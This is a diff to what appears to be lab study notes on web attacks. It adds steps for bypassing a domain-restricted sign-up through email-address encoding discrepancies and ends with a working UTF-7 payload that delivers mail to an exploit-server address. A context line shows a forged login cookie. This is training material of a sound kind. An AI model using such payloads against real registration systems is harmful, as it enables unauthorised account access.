@@ -664,7 +664,16 @@
       GET / HTTP/2   
       Cookie: stay-logged-in=%52%72%76%64%79%4c%51%74%49%67%59%41%2b%58%65%5a%37%6d%4e%33%4e%62%64%73%63%48%52%2f%61%34%49%4a%54%41%4d%74%39%38%6a%79%6e%4f%59%3d;
       ```
-  - Gain access as an admin and perform the required action
+    - Gain access as an admin and perform the required action
+  - Bypassing access controls using **email address parsing discrepancies**
+    - Investigate encoding discrepancies (Register account)
+      - #1 hello@hacker.com > "Only emails with the ginandjuice.shop domain are allowed"
+      - #2 abcfoo@ginandjuice.shop (abc Q encoding) > =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
+      - #3 UTF-8 encoded  > =?utf-8?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
+      - #4 UTF-7 encoded > =?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop > Register successfully  
+    - Exploit the vulnerability using UTF-7
+      - =?utf-7?q?attacker&AEA-exploit-0aa5000004a190348123f6f9016b004a.exploit-server.net&ACA-?=@ginandjuice.shop > email received
+      - This is the string attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop, with the @ symbol and space encoded in UTF-7.
     
 ## Command Injection
 **How to test**
